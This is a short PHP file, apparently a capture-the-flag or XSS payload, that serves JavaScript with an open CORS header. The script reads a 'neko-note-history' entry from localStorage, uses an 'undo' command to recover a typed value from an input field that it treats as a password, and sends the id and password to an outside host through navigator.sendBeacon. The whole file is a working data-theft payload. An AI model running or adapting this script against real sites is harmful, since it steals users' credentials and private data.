<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>
const h = localStorage.getItem('neko-note-history');
const id = JSON.parse(h)[0].id;
document.execCommand('undo');
const pw = document.querySelector('input').value;
navigator.sendBeacon(`https://example.com/?id=${id}&pw=${pw}`);